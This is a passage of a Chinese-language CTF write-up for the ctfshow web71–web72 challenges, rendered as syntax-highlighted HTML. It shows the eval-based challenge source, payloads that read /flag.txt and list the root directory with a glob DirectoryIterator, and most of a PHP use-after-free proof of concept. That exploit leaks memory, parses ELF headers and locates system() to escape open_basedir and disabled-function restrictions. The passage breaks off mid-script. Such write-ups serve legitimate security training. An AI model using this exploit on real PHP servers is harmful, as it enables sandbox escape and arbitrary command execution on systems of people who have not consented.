class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>会把缓存给清空，不执行后面的语句即可</p><p>payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="31-web72"><a href="#31-web72" class="headerlink" title="31. web72"></a>31. web72</h2><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'display_errors'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 你们在炫技吗？</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|[a-z]/i"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"?"</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'glob:///*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-&gt;</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// /flag0.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>当去读取 flag 是发现限制了 open_basedir</p><p>使用脚本绕过读取文件</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">ctfshow</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">,</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Vuln</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token keyword">global</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span>             <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">getTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token function">debug_backtrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Helper</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token variable">$d</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">str2ptr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$s</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$address</span> <span class="token operator">&lt;&lt;</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>            <span class="token variable">$address</span> <span class="token operator">|=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$address</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">ptr2str</span><span class="token punctuation">(</span><span class="token variable">$ptr</span><span class="token punctuation">,</span> <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$m</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$out</span> <span class="token operator">.=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$ptr</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$ptr</span> <span class="token operator">&gt;&gt;</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$out</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$n</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$v</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$v</span> <span class="token operator">&gt;&gt;</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>        <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$p</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-&gt;</span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">!=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token variable">$leak</span> <span class="token operator">%=</span> <span class="token number">2</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$leak</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$e_type</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phoff</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phentsize</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$e_phnum</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$e_phnum</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$header</span> <span class="token operator">=</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$e_phoff</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token variable">$e_phentsize</span><span class="token punctuation">;</span>            <span class="token variable">$p_type</span>  <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_flags</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_vaddr</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$p_memsz</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                 <span class="token variable">$data_addr</span> <span class="token operator">=</span> <span class="token variable">$e_type</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">?</span> <span class="token variable">$p_vaddr</span> <span class="token punctuation">:</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$p_vaddr</span><span class="token punctuation">;</span>                <span class="token variable">$data_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                 <span class="token variable">$text_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data_addr</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$text_size</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$data_size</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$elf</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$data_size</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x746e6174736e6f63</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x786568326e6962</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token variable">$data_addr</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$base</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token variable">$binary_leak</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x1000</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$start</span> <span class="token operator">-</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token variable">$i</span><span class="token punctuation">;</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">==</span> <span class="token number">0x10102464c457f</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token variable">$addr</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$basic_funcs</span><span class="token punctuation">;</span>        <span class="token keyword">do</span> <span class="token punctuation">{</span>            <span class="token variable">$f_entry</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$f_name</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f_name</span> <span class="token operator">==</span> <span class="token number">0x6d6574737973</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$addr</span> <span class="token operator">+=</span> <span class="token number">0x20</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function-definition function">trigger_uaf</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$vuln</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$vuln</span><span class="token operator">-&gt;</span><span class="token property">a</span> <span class="token operator">=</span> <span class="token variable">$arg</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token constant">PHP_OS</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'WIN'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'This PoC is for *nix systems only.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$n_alloc</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>     <span class="token variable">$contiguous</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n_alloc</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token variable">$contiguous</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">trigger_uaf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$abc</span> <span class="token operator">=</span> <span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$helper</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Helper</span><span class="token punctuation">;</span>    <span class="token variable">$helper</span><span class="token operator">-&gt;</span><span class="token property">b</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">79</span> <span class="token operator">||</span> <span class="token class-name">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"UAF failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$closure_handlers</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$php_heap</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$abc_addr</span> <span class="token operator">=</span> <span class="token variable">$php_heap</span> <span class="token operator">-</span> <span class="token number">0xc8</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token 